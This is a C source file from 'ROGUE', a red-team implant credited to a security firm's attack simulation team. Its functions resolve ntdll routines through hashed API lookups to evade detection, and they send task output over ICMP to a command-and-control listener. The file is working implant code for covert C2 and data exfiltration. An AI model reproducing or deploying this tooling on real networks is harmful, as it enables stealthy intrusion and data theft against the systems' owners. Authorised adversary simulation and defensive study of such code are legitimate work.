/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
	D_API( _vsnprintf );
} API ;

/* API Hashes */
#define H_API_RTLALLOCATEHEAP	0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP	0x73a9e4d7 /* RtlFreeHeap */
#define H_API_VSNPRINTF		0xa59022ce /* _vsnprintf */

#define H_LIB_NTDLL		0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Dispatches a raw message to the Navi web
 * server. If a client is listening in the
 * logs, it will print the data out.
 *
!*/
D_SEC( B ) VOID RogueOutput( _In_ PROGUE_CTX Context, _In_ PCHAR Buffer, _In_ UINT32 Length )
{
	API		Api;

	PBUFFER		Buf = NULL;
	PTASK_RET_HDR	Ret = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api._vsnprintf      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_VSNPRINTF );

	/* Create a message */
	if ( ( Buf = BufferCreate() ) != NULL ) {
		if ( BufferAddRaw( Buf, Context->Id, sizeof( Context->Id ) ) ) {
			if ( BufferExtend( Buf, sizeof( TASK_RET_HDR ) ) ) {
				if ( BufferAddRaw( Buf, Buffer, Length ) ) {
					Ret = C_PTR( U_PTR( Buf->Buffer ) + sizeof( Context->Id ) );
					Ret->TaskId = 0;
					Ret->CallbackId = PrintOutputAction;
					Ret->ReturnCode = 0; // change me!
					Ret->ErrorValue = 0;

					IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Buf->Buffer, Buf->Length, NULL, NULL, NULL );
				};
			};
		};
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Buf->Buffer );
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Buf );
		Buf = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};

/*!
 *
 * Purpose:
 *
 * Dispatches a formatted message to the Navi
 * webserver. If a client is listening in the
 * logs, it will print the data out.
 *
!*/
D_SEC( B ) VOID RoguePrintf( _In_ PROGUE_CTX Context, _In_ PCHAR Format, ... ) 
{
	API		Api;
	va_list		Lst;

	SIZE_T		Len = 0;

	PBUFFER		Buf = NULL;
	PTASK_RET_HDR	Ret = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Lst, sizeof( Lst ) );

	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api._vsnprintf      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_VSNPRINTF );

	/* Create a message! */
	if ( ( Buf = BufferCreate() ) != NULL ) {
		if ( BufferAddRaw( Buf, Context->Id, sizeof( Context->Id ) ) ) {
			if ( BufferExtend( Buf, sizeof( TASK_RET_HDR ) ) ) {
				va_start( Lst, Format );
				Len = Api._vsnprintf( NULL, 0, Format, Lst );
				va_end( Lst );

				if ( BufferExtend( Buf, Len ) ) {
					Ret = C_PTR( U_PTR( Buf->Buffer ) + sizeof( Context->Id ) );
					Ret->TaskId = 0;
					Ret->CallbackId = PrintOutputAction;
					Ret->ReturnCode = 0; // change me!
					Ret->ErrorValue = 0;

					va_start( Lst, Format );
					Len = Api._vsnprintf( Ret->Buffer, Len, Format, Lst );
					va_end( Lst );

					IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Buf->Buffer, Buf->Length, NULL, NULL, NULL );
				};
			};
		};
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Buf->Buffer );
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Buf );
		Buf = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Lst, sizeof( Lst ) );
};
